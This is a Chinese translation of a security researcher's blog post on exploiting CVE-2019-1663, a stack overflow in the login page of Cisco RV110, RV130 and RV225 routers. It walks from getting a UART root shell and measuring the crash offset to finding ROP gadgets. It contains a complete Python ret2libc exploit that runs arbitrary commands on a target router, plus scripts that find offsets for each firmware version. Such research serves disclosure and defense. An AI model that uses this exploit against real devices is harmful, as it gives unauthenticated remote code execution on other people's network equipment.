# 对Cisco (RV110, RV130, RV225) 栈溢出漏洞的分析和利用

阅读量 **586628**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-09-23 14:30:45

 **x**

##### 译文声明

本文是翻译文章，文章原作者 quentinkaiser，文章来源：quentinkaiser.be

原文地址：<https://quentinkaiser.be/exploitdev/2019/08/30/exploit-CVE-2019-1663/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01f8ad86b026a76659.jpg)

几个月前，我在Pentest Partners发表了[一篇文章，](https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/)，简要解释了CVE-2019-1663漏洞的一些原理，这是一个影响Cisco多个低端设备的栈缓冲区溢出漏洞（RV110，RV130，RV225），这篇文章我将详细分析一下怎么利用这个漏洞。

## 0x00 获得设备root shell

刚开始使用的是QEMU，把固件解压缩之后运行发现这个和真实的思科路由器上的漏洞点是有偏差的，因此即使漏洞利用成功了也没有太大价值，因此，我在eBay上买了一个二手的路由器设备。

我想通过SSH或使用terminal在设备上获得一个shell，但RV130都不能实现。

为了解决这个问题，我拆开了路由器并确定了UART引脚排列，这样我可以使用Shikra进行串行连接。

![](https://qkaiser.github.io//assets/cisco_rv130_uart.jpg)

我没有逻辑分析仪，所以我通过反复试验确定了波特率（正确的波特率是38400）。设备启动后就可以得到root shell 🙂

    
    
    U-Boot 2008.10-mpcore-svn4057 (Mar 30 2017 - 17:03:34)
    Cavium Networks CNS3XXX SDK v1.2-2515 CNS3420vb2x parallel flash
    
    CyberTan U-Boot Version: 1.0.3.28
    
    CPU: Cavium Networks CNS3000
    ID Code: 410fb024 (Part number: 0xB02, Revision number: 4) 
    CPU ID: 900 
    Chip Version: c
    Boot from parallel flash
    
    --boot log--    BusyBox v1.7.2 (2017-03-30 17:11:36 CST) built-in shell (ash)
    Enter 'help' for a list of built-in commands.
    
    # id
    uid=0 gid=0
    # uname -avr
    Linux RV130W 2.6.31.1-cavm1 #1 Thu Mar 30 17:04:29 CST 2017 armv6l unknown
    

现在开始重现crash！

## 0x01 重现漏洞crash

如果度过之前Pentest Partners的那篇文章，也会看到下面的请求包：

    
    
    POST /login.cgi HTTP/1.1
    Host: 192.168.22.158
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://192.168.22.158/
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 571
    
    submit_button=login&submit_type=&gui_action=&default_login=1&wait_time=0&change_action=&enc=1
    &user=cisco&pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ
    &sel_lang=EN
    

第一步是在设备上获取gdbserver并将其附加到我们正在运行的http服务器上。我从repo]([https://github.com/hugsy/gdb-static/)下载了ARMv6l静态链接版本的gdbserver](https://github.com/hugsy/gdb-static/\)%E4%B8%8B%E8%BD%BD%E4%BA%86ARMv6l%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%89%88%E6%9C%AC%E7%9A%84gdbserver)
。

    
    
    # cd /tmp/
    # wget http://192.168.1.100:8000/gdbserver
    Connecting to 192.168.1.100:8000 (192.168.1.100:8000)
    gdbserver            100% |*******************************|  1599k --:--:-- ETA
    # chmod +x gdbserver
    # ps w | grep httpd
      808 0          5028 S   httpd
      816 0          5092 S   httpd -S
    # ./gdbserver --attach :1234 816
    Attached; pid = 816
    Listening on port 1234
    

现在可以使用gdb-multiarch远程连接到gdbserver上，使用以下GDB初始化文件来简化操作：

    
    
    set architecture arm
    set follow-fork-mode child
    file /home/quentin/research/RV130/squashfs-root/usr/sbin/httpd
    set solib-search-path /home/quentin/research/RV130/squashfs-root/lib
    target remote 192.168.1.1:1234
    

当提交示例请求时，将看到如下所示的段错误，这就触发成功了！

![](https://qkaiser.github.io//assets/cisco_rv130_bug_repro.png)

## 0x02 计算缓冲区覆盖长度

为了知道溢出 _strcpy_ 要复制的缓冲区长度，可以使用gef“pattern create”和“pattern search”。

    
    
    gef➤ pattern create 512
    [+] Generating a pattern of 512 bytes
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
    zaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
    zaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
    zaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
    zaafbaafcaaf
    [+] Saved as '$_gef0'
    

触发crash：

    
    
    curl -i -k -X POST https://192.168.1.1/login.cgi -d 'submit_button=login&submit_type=&gui_action=&default_login=1&wait_time=0&change_action=&enc=1&user=cisco&pwd=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf&sel_lang=EN'
    

当可执行文件尝试在0x616d6560执行指令时，可以看到崩溃发生了：

    
    
    gef➤  c
    Continuing.
    
    Program received signal SIGSEGV, Segmentation fault.
    0x616d6560 in ?? ()
    

现在就可以找到偏移量了，但是要注意，搜索的是`0x616d6561`而不是`0x616d6560`，因为当最低有效位为偶数时，ARM
CPU会切换到thumb模式。

    
    
    gef➤  pattern search 0x616d6561
    [+] Searching '0x616d6561'
    [+] Found at offset 446 (little-endian search) likely
    

现在知道漏洞利用的payload需要填充446个字节，以便溢出缓冲区并控制程序弹出计算器。

## 0x03 Ret2Libc

![](https://qkaiser.github.io//assets/ret2libc.jpeg)

第一个漏洞将利用“Ret2Libc”，简单解释一下：执行ROP链来使堆栈可执行，然后使程序计数器指向堆栈来执行shellcode，我们只需使r0（第一个参数）指向堆栈然后call`system`就可以实现。

为此，我们需要获得以下内容：

  * 系统映射时libc的基址
  * libc中系统的偏移地址
  * 一个gadget，用于将堆栈指针值移动到r0中
  * 一个gadget，用于将程序计数器从堆栈中弹出进行系统调用

通过实时调试会话获得前两个地址很容易，首先调用`vmmap`以查看内存映射，可以看到libc被映射到了`0x357fb000`。

    
    
    gef➤  vmmap
    Start      End        Offset     Perm Path
    0x00008000 0x00099000 0x00000000 r-x /usr/sbin/httpd
    0x000a0000 0x000a9000 0x00090000 rwx /usr/sbin/httpd
    0x000a9000 0x000de000 0x00000000 rwx [heap]
    0x35556000 0x35557000 0x00000000 rwx 
    0x35558000 0x3555d000 0x00000000 r-x /lib/ld-uClibc.so.0
    0x35564000 0x35565000 0x00004000 r-x /lib/ld-uClibc.so.0
    0x35565000 0x35566000 0x00005000 rwx /lib/ld-uClibc.so.0
    0x35566000 0x3556d000 0x00000000 r-x /usr/lib/libnvram.so
    0x3556d000 0x35574000 0x00000000 --- 
    0x35574000 0x35575000 0x00006000 rwx /usr/lib/libnvram.so
    0x35575000 0x3557d000 0x00000000 rwx 
    0x3557d000 0x355d7000 0x00000000 r-x /usr/lib/libshared.so
    0x355d7000 0x355de000 0x00000000 --- 
    0x355de000 0x355e4000 0x00059000 rwx /usr/lib/libshared.so
    0x355e4000 0x355ed000 0x00000000 rwx 
    0x355ed000 0x35608000 0x00000000 r-x /usr/lib/libcbt.so
    0x35608000 0x35610000 0x00000000 --- 
    0x35610000 0x35611000 0x0001b000 rwx /usr/lib/libcbt.so
    0x35611000 0x35612000 0x00000000 r-x /usr/lib/librogueap.so
    0x35612000 0x3561a000 0x00000000 --- 
    0x3561a000 0x3561b000 0x00001000 rwx /usr/lib/librogueap.so
    0x3561b000 0x35672000 0x00000000 r-x /usr/lib/libssl.so.1.0.0
    0x35672000 0x3567a000 0x00000000 --- 
    0x3567a000 0x35680000 0x00057000 rwx /usr/lib/libssl.so.1.0.0
    0x35680000 0x357dd000 0x00000000 r-x /usr/lib/libcrypto.so.1.0.0
    0x357dd000 0x357e4000 0x00000000 --- 
    0x357e4000 0x357f9000 0x0015c000 rwx /usr/lib/libcrypto.so.1.0.0
    0x357f9000 0x357fb000 0x00000000 rwx 
    0x357fb000 0x35858000 0x00000000 r-x /lib/libc.so.0
    0x35858000 0x35860000 0x00000000 --- 
    0x35860000 0x35861000 0x0005d000 r-x /lib/libc.so.0
    0x35861000 0x35862000 0x0005e000 rwx /lib/libc.so.0
    0x35862000 0x35867000 0x00000000 rwx 
    0x35867000 0x35869000 0x00000000 r-x /lib/libdl.so.0
    0x35869000 0x35870000 0x00000000 --- 
    0x35870000 0x35871000 0x00001000 r-x /lib/libdl.so.0
    0x35871000 0x35872000 0x00000000 rwx 
    0x35872000 0x3587c000 0x00000000 r-x /lib/libgcc_s.so.1
    0x3587c000 0x35883000 0x00000000 --- 
    0x35883000 0x35884000 0x00009000 rwx /lib/libgcc_s.so.1
    0x35884000 0x35904000 0x00000000 rwx /SYSV00000457(deleted)
    0x35904000 0x35984000 0x00000000 r-x /SYSV00000457(deleted)
    0x9efaa000 0x9efbf000 0x00000000 rw- [stack]
    

系统的偏移量可以使用radare2：

    
    
    radare2 -A libc.so.0
    [x] Analyze all flags starting with sym. and entry0 (aa)
    [Value from 0x00000000 to 0x0005cfec
    [x] Analyze len bytes of instructions for references (aar)
    [x] Analyze function calls (aac)
    [x] Constructing a function name for fcn.* and sym.func.* functions (aan)
    [0x0000bbc0]> afl | grep system
     0x0003ed84    1 72           sym.svcerr_systemerr
     0x0004d144    7 328          sym.system
    

或者使用GDB：

    
    
    gef➤  b system
    Breakpoint 1 at 0x35848144
    

GDB中的值只是函数偏移量（`0x0004d144`添加到libc的map映射`0x357fb000`中）。

这样就得到了系统地址，现在我们需要找到一个gadget，需要使用Ropper]([https://github.com/sashs/Ropper)。](https://github.com/sashs/Ropper\)%E3%80%82)

    
    
    (ropper)> file libc.so.0
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] File loaded.
    (libc.so.0/ELF/ARM)> search mov r0, sp
    [INFO] Searching for gadgets: mov r0, sp
    
    [INFO] File: libc.so.0
    0x00010d08: mov r0, sp; bl #0xba64; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
    0x00028700: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x10; pop {r4, r5, r6, pc};
    0x00028764: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x14; pop {r4, r5, pc};
    0x00018964: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
    0x0002868c: mov r0, sp; bl #0xba64; mov r0, r6; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
    0x0004ab0c: mov r0, sp; bl #0xf170; add sp, sp, #0xc; pop {r4, r5, pc};
    0x00041308: mov r0, sp; blx r2;
    0x00041308: mov r0, sp; blx r2; add sp, sp, #0x1c; ldm sp!, {pc}; mov r0, #1; bx lr;
    0x00037884: mov r0, sp; blx r3;
    --snip--    

可以看一下`0x00041308`这个地址，需要找到一个可以从堆栈中弹出r2的gadget。

    
    
    (libc.so.0/ELF/ARM)> search pop {r2
    [INFO] Searching for gadgets: pop {r2
    
    [INFO] File: libc.so.0
    0x00052620: pop {r2, r3}; bx lr;
    0x00052620: pop {r2, r3}; bx lr; push {r1, lr}; mov r0, #8; bl #0xbba8; pop {r1, pc};
    

没有找到可用的gadget，切换到THUMB模式看一下：

    
    
    (libc.so.0/ELF/ARM)> arch ARMTHUMB
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    (libc.so.0/ELF/ARMTHUMB)> search pop {r2
    [INFO] Searching for gadgets: pop {r2
    
    [INFO] File: libc.so.0
    0x000060b8 (0x000060b9): pop {r2, r3, r4, r5, pc};
    0x0003d1bc (0x0003d1bd): pop {r2, r3, r4, r5, r6, pc};
    0x00020b98 (0x00020b99): pop {r2, r3, r4, r5, r6, r7, pc};
    0x00053294 (0x00053295): pop {r2, r3, r4, r5, r7, pc};
    0x0002a0e4 (0x0002a0e5): pop {r2, r3, r4, r6, r7, pc};
    0x00027b80 (0x00027b81): pop {r2, r3, r4, r7, pc};
    0x00020bd8 (0x00020bd9): pop {r2, r3, r5, r6, r7, pc};
    0x0003d11c (0x0003d11d): pop {r2, r3, r5, r7, pc};
    0x00020e38 (0x00020e39): pop {r2, r4, r6, pc};
    0x00006eb8 (0x00006eb9): pop {r2, r5, r6, r7, pc};
    0x00020e78 (0x00020e79): pop {r2, r6, pc};
    0x000209f6 (0x000209f7): pop.w {r2, r6, r7, sl, ip, lr}; movs r4, r0; lsls r4, r1, #0x1d; movs r0, r0; blx lr;
    0x000443ae (0x000443af): pop.w {r2, r6, r8, sb, fp, ip}; movs r2, r0; strh r4, [r0, r7]; movs r0, r0; blx lr;
    

可以使用`0x00020e79`处的gadget。

## 0x04 Exploit MVP

用Python快速写一个可用的exp：

    
    
    #!/usr/bin/env python
    """
    Exploit for Cisco RV130 stack-based buffer overflow (CVE-2019-1663).
    
    This piece of code will execute a command on the device by using ret2libc
    technique.
    """
    import struct
    import sys
    import requests
    
    
    offset = 446
    libc_base_addr = 0x357fb000
    system_offset = 0x0004d144
    gadget1 = 0x00020e79 # pop {r2, r6, pc};
    gadget2 = 0x00041308 # mov r0, sp; blx r2;
    
    def exploit(ip, cmd):
    
        buf = "A" * offset
        buf += struct.pack("<L", libc_base_addr + gadget1)
        buf += struct.pack("<L", libc_base_addr + system_offset) # r2
        buf += "XXXX"                                            # r6
        buf += struct.pack("<L", libc_base_addr + gadget2) #pc
        buf += cmd
    
        params = {
            "submit_button": "login",
            "submit_type": None,
            "gui_action": None,
            "wait_time": 0,
            "change_action": None,
            "enc": 1,
            "user": "cisco",
            "pwd": buf,
            "sel_lang": "EN"
        }
        requests.post("https://%s/login.cgi" % ip, data=params, verify=False)
    
    if __name__ == '__main__':
        if len(sys.argv) < 3:
            print("Usage: %s ip cmd" % (sys.argv[0]))
            sys.exit(1)
        exploit(sys.argv[1], sys.argv[2])
    

该漏洞利用将遵循以下步骤：

我们用 _gadget1_ 的地址覆盖programm计数器。执行 _gadget1_ （`pop {r2, r6, pc}`）时，堆栈如下所示：

![](https://qkaiser.github.io//assets/rv130_stack1.png)

这意味着r2将保存 _系统_ 地址，r6随机产生garbage，程序计数器将保存 _gadget2_ de 地址，使程序跳转到该地址。

执行gadget2时，堆栈如下所示：

![](https://qkaiser.github.io//assets/rv130_stack2.png)

然后跳转到r2，它会把地址保存到系统中，r0会作为参数，因为r0指向堆栈，`system`就会执行我们的命令。

## 0x05 漏洞利用

针对RV130的利用很容易，因为libc.so在发行版之间没有什么变化，就是说无论固件版本如何，所有偏移都是相同的：

    
    
    find -name“libc.so.0”-exec sha1sum {} ;
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.0.21/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.1.3/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.2.7./lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.14/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.16/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.22/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.28/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.44/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.45/lib/libc.so.0
    a9cc842a0641dff43765c9110167316598252a5f ./RV130X_FW_1.0.3.51/lib/libc.so.0
    

为了适应Metasploit的模块，利用RV110W和RV215W设备时，需要找到针对每个固件版本的偏移。

因此，我编写了两个利用radare2和Ropper的脚本。

第一个脚本会从提供的libc文件中自动返回系统地址：

    
    
    #!/usr/bin/env python
    import sys
    import json
    import r2pipe
    import os
    
    def get_system_offset(executable):
        """
        Args:
            executable(str): path to ELF file
        Returns:
            offset(int): address of system
        """
        r = r2pipe.open(executable, flags=['-2'])
        r.cmd('aa')
        functions = json.loads(r.cmd("aflj"))
        for f in functions:
            if f['name'] == 'sym.system':
                return hex(f['offset'])
        r.quit()
    
    if __name__ == "__main__":
        if len(sys.argv) < 2:
            print("Usage: {} executable_path".format(sys.argv[0]))
            sys.exit(-1)
    
        print("{} - {}".format(sys.argv[1], get_system_offset(sys.argv[1])))
    

以下是利用脚本在所有RV110固件版本中搜索到的系统偏移：

    
    
    find -type f -name'libc.so.0'-exec ./find_system.py {} ; 
    ./firmwares/RV110W_FW_1.1.0.9/lib/libc.so.0  -  0x50d40
    ./firmwares/RV110W_FW_1.2.0.9/lib/libc.so.0  -  0x4c7e0
    ./firmwares/RV110W_FW_1.2.0.10/lib/libc.so.0  -  0x4c7e0
    ./firmwares/RV110W_FW_1.2.1.4/lib/libc.so.0  -  0x4c7e0
    ./firmwares/RV110W_FW_1.2.1.7/lib/libc.so.0  -  0x4c7e0
    ./firmwares/RV110W_FW_1.2.2.1/lib/libc.so.0  -  0x50d40
    ./firmwares/RV110W_FW_1.2.2.4/lib/libc.so.0  -  0x4c7e0
    

第二个在文件中找到特定gadget的偏移量：

    
    
    #!/usr/bin/env python
    from ropper import RopperService
    import sys
    # not all options need to be given
    options = {'color' : False,     # if gadgets are printed, use colored output: default: False
                'badbytes': '00',   # bad bytes which should not be in addresses or ropchains; default: ''
                'all' : False,      # Show all gadgets, this means to not remove double gadgets; default: False
                'inst_count' : 6,   # Number of instructions in a gadget; default: 6
                'type' : 'all',     # rop, jop, sys, all; default: all
                'detailed' : False} # if gadgets are printed, use detailed output; default: False
    
    rs = RopperService(options)
    
    ##### change options ######
    rs.options.color = True
    rs.options.badbytes = '00'
    rs.options.badbytes = ''
    rs.options.all = True
    
    
    ##### open binaries ######
    # it is possible to open multiple files
    rs.addFile(sys.argv[1], arch='MIPS')
    
    # load gadgets for all opened files
    rs.loadGadgetsFor()
    
    result_dict = rs.searchdict(search=sys.argv[2])
    for file, gadgets in result_dict.items():
        print file
        for gadget in gadgets:
            print hex(gadget.address), gadget
    

使用一下：

    
    
    find -name "libcrypto.so" -exec ./search_gadget.py {} 'addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;' ;
    ./RV110W_FW_1.1.0.9/usr/lib/libcrypto.so
    0x167c8cL 0x00167c8c: addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
    ./RV110W_FW_1.2.0.9/usr/lib/libcrypto.so
    0x167c4cL 0x00167c4c: addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
    ./RV110W_FW_1.2.0.10/usr/lib/libcrypto.so
    0x151fbcL 0x00151fbc: addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
    ./RV110W_FW_1.2.1.4/usr/lib/libcrypto.so
    0x5059cL 0x0005059c: addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
    ./RV110W_FW_1.2.1.7/usr/lib/libcrypto.so
    0x3e7dcL 0x0003e7dc: addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
    

## 0x06 总结

想要利用此漏洞的话，可以在Metasploit中找到对应的模块。

<https://github.com/rapid7/metasploit-framework/pull/12133>

本文翻译自quentinkaiser.be
[原文链接](https://quentinkaiser.be/exploitdev/2019/08/30/exploit-CVE-2019-1663/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0xbird** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/186523](/post/id/186523)

安全客 - 有思想的安全新媒体

本文转载自:
[quentinkaiser.be](https://quentinkaiser.be/exploitdev/2019/08/30/exploit-CVE-2019-1663/)

如若转载,请注明出处： <https://quentinkaiser.be/exploitdev/2019/08/30/exploit-CVE-2019-1663/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [路由器](/tag/路由器)

 **+1** __3赞

 __收藏

![](https://p0.ssl.qhimg.com/t0182953edce0965b12.png) 0xbird

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

